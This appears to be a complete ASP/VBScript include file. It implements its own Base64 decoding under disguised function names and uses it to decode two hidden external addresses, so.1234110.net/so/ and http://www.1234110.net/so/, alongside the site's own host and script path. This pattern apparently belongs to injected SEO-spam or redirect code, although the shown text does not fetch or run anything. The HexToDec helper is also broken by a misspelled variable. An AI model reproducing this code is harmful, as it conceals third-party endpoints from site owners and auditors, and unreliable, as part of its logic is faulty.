<%  
passe=Request.ServerVariables("Script_Name")
passe1=split(passe,"/")
passe2=UBound(passe1)
passe3=Replace(passe,passe1(passe2),"")
ssturl=Request.ServerVariables("HTTP_HOST")&passe3
CONST urlttsd="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Dim MapEnc(63)
Dim MapDec(127)
Dim i
For i=0 To 63
    MapEnc(i)=Mid(urlttsd,i+1,1)
Next
For i=0 To 63
    MapDec(Asc(MapEnc(i)))=i
Next
Set i=Nothing
Private Function DecToBin(intDecimal)
 Dim strBinary,blnFlag
 strBinary=""
 blnFlag=True
 Do While blnFlag
    strBinary=Cstr(intDecimal AND &H01)&strBinary
    intDecimal=intDecimal\2
    If intDecimal=0 Then blnFlag=False
 Loop
 Set blnFlag=Nothing
 strBinary=Right("00000000"&strBinary,8)
 DecToBin=strBinary
 Set strBinary=Nothing
End Function
Private Function BinToDec(strBin)
 Dim intDec,i,j
 intDec=0
 j=Len(strBin)
 For i=1 To j
     intDec=intDec+2^(j-i)*CInt(Mid(strBin,i,1))
 Next
 Set i=Nothing
 Set j=Nothing
 BinToDec=intDec
 Set intDec=Nothing
End Function
Private Function Bin24Encode(strBin24)
 Dim strEncoder,strBin6
 strEncoder=""
 If (Len(strBin24)<=8) Then
    strBin24=Left(strBin24&"00000000",8)
    strBin6="00"&Mid(strBin24,1,6)
    strEncoder=MapEnc(BinToDec(strBin6))
    strBin6="00"&Mid(strBin24,7,2)&"0000"
    strEncoder=strEncoder&MapEnc(BinToDec(strBin6))
    strEncoder=strEncoder&"=="
 Else If (Len(strBin24)<=16) Then
     strBin24=Left(strBin24&"00000000",16)
     strBin6="00"&Mid(strBin24,1,6)
     strEncoder=MapEnc(BinToDec(strBin6))
     strBin6="00"&Mid(strBin24,7,6)
     strEncoder=strEncoder&MapEnc(BinToDec(strBin6))
     strBin6="00"&Mid(strBin24,13,4)&"00"
     strEncoder=strEncoder&MapEnc(BinToDec(strBin6))
     strEncoder=strEncoder&"="
      Else
     strBin24=Left(strBin24&"00000000",24)
     strBin6="00"&Mid(strBin24,1,6)
     strEncoder=MapEnc(BinToDec(strBin6))
     strBin6="00"&Mid(strBin24,7,6)
     strEncoder=strEncoder&MapEnc(BinToDec(strBin6))
     strBin6="00"&Mid(strBin24,13,6)
     strEncoder=strEncoder&MapEnc(BinToDec(strBin6))
     strBin6="00"&Mid(strBin24,19,6)
     strEncoder=strEncoder&MapEnc(BinToDec(strBin6))
      End If
 End If
 Set strBin6=Nothing
 Bin24Encode=strEncoder
 Set strEncoder=Nothing
End Function
Private  Function HexToDec(strHex)
 Dim intDec,i,j
 j=Len(strHex)
 intDec=0
 For i=1 To j
   Select Case Mid(strHex,i,1)
    Case "0" intDec=intDex+16^(j-i)*0
    Case "1" intDec=intDex+16^(j-i)*1
    Case "2" intDec=intDex+16^(j-i)*2
    Case "3" intDec=intDex+16^(j-i)*3
    Case "4" intDec=intDex+16^(j-i)*4
    Case "5" intDec=intDex+16^(j-i)*5
    Case "6" intDec=intDex+16^(j-i)*6
    Case "7" intDec=intDex+16^(j-i)*7
    Case "8" intDec=intDex+16^(j-i)*8
    Case "9" intDec=intDex+16^(j-i)*9
    Case "A" intDec=intDex+16^(j-i)*10
    Case "B" intDec=intDex+16^(j-i)*11
    Case "C" intDec=intDex+16^(j-i)*12
    Case "D" intDec=intDex+16^(j-i)*13
    Case "E" intDec=intDex+16^(j-i)*14
    Case "F" intDec=intDex+16^(j-i)*15
  End Select
 Next
 Set i=Nothing
 HexToDec=intDec
 Set intDec=Nothing
End Function
Private Function HexToBin(strHex)
 Dim strBin,i,j
 j=Len(strHex)
 strBin=""
 For i=1 To j
  Select Case Mid(strHex,i,1)
    Case "0" strBin=strBin&"0000"
    Case "1" strBin=strBin&"0001"
    Case "2" strBin=strBin&"0010"
    Case "3" strBin=strBin&"0011"
    Case "4" strBin=strBin&"0100"
    Case "5" strBin=strBin&"0101"
    Case "6" strBin=strBin&"0110"
    Case "7" strBin=strBin&"0111"
    Case "8" strBin=strBin&"1000"
    Case "9" strBin=strBin&"1001"
    Case "A" strBin=strBin&"1010"
    Case "B" strBin=strBin&"1011"
    Case "C" strBin=strBin&"1100"
    Case "D" strBin=strBin&"1101"
    Case "E" strBin=strBin&"1110"
    Case "F" strBin=strBin&"1111"
  End Select
 Next
 Set i=Nothing
 Set j=Nothing
 HexToBin=strBin
 Set strBin=Nothing
End Function
Private Function BinToHex(strBin)
 Dim strHex,strBin4
 strHex=""
 Do While strBin<>""
   strBin4=Mid(strBin,1,4)
   If Len(strBin)>4 Then
      strBin=Mid(strBin,5,Len(strBin)-4)
   Else
      strBin=""
   End If
   Select Case strBin4
    Case "0000" strHex=strHex&"0"
    Case "0001" strHex=strHex&"1"
    Case "0010" strHex=strHex&"2"
    Case "0011" strHex=strHex&"3"
    Case "0100" strHex=strHex&"4"
    Case "0101" strHex=strHex&"5"
    Case "0110" strHex=strHex&"6"
    Case "0111" strHex=strHex&"7"
    Case "1000" strHex=strHex&"8"
    Case "1001" strHex=strHex&"9"
    Case "1010" strHex=strHex&"A"
    Case "1011" strHex=strHex&"B"
    Case "1100" strHex=strHex&"C"
    Case "1101" strHex=strHex&"D"
    Case "1110" strHex=strHex&"E"
    Case "1111" strHex=strHex&"F"
  End Select
 Loop
 Set strBin4=Nothing
 BinToHex=strHex
 Set strHex=Nothing
End Function
PUBLIC Function Encode(strText)
 Dim strTemp24,strBinarySource,strCode,intAsc,strHex,i,j
 strTemp24=""
 strBinarySource=""
 strCode=""
 j=Clng(Len(strText))
 For i=1 To j
     intAsc=Asc(Mid(strText,i,1))
     If intAsc>=0 AND intAsc<128 Then
    strBinarySource=strBinarySource&DecToBin(intAsc)
     Else
    strHex=CStr(Hex(intAsc))
    strHex=Right("0000"&strHex,4)
    strBinarySource=strBinarySource & HexToBin(strHex)
     End If
 Next
 Do While (strBinarySource<>"")
    If Clng(Len(strBinarySource))>=24 Then
    strTemp24=Mid(strBinarySource,1,24)
    strBinarySource=Mid(strBinarySource,25,Len(strBinarySource)-24)
    Else
    strTemp24=Mid(strBinarySource,1,Len(strBinarySource))
    strBinarySource=""
    End If
    strCode=strCode&Bin24Encode(strTemp24)
 Loop
 Set i=Nothing
 Set j=Nothing
 Set intAsc=Nothing
 Set strTemp24=Nothing
 Set strBinarySource=Nothing
 Set i=Nothing
 Encode=strCode
 Set strCode=Nothing
End Function
PUBLIC Function urlssc(strCode)
 Dim i,j,strText,strBinarySource,strTemp8,intIndex
 j=Clng(Len(strCode))
 strText=""
 strBinarySource=""
 For i=1 To j
     intIndex=MapDec(Asc(Mid(strCode,i,1)))
     If Mid(strCode,i,1)<>"=" Then strBinarySource=strBinarySource&Right(DecToBin(intIndex),6)
 Next
 Do While (strBinarySource<>"")
    If Len(strBinarySource)>8 Then
       strTemp8=Mid(strBinarySource,1,8)
       strBinarySource=Mid(strBinarySource,9,Len(strBinarySource)-8)
    Else
       If Len(strBinarySource)=8 Then strTemp8=Mid(strBinarySource,1,8)
       strBinarySource=""
    End If
    If Mid(strTemp8,1,1)="0" Then
       strText=strText&Chr(BinToDec(strTemp8))
    Else
       If Len(strBinarySource)>8 Then
          strTemp8=strTemp8&Mid(strBinarySource,1,8)
          strBinarySource=Mid(strBinarySource,9,Len(strBinarySource)-8)
          strText=strText& Chr("&H"& BinToHex(strTemp8))
       Else
          If Len(strBinarySource)=8 Then
             strTemp8=strTemp8&Mid(strBinarySource,1,8)
             'response.write BinToHex(strTemp8)&"<br>"
             strText=strText& Chr("&H" & BinToHex(strTemp8))
          End If
          strBinarySource=""
       End If
    End If
 Loop
 Set strBinarySource=Nothing
 Set intIndex=Nothing
 Set i=Nothing
 Set j=Nothing
 urlssc=strText
 Set strText=Nothing
End Function
aspurl=urlssc("c28uMTIzNDExMC5uZXQvc28v")
tsourl=urlssc("aHR0cDovL3d3dy4xMjM0MTEwLm5ldC9zby8=")
 %>  
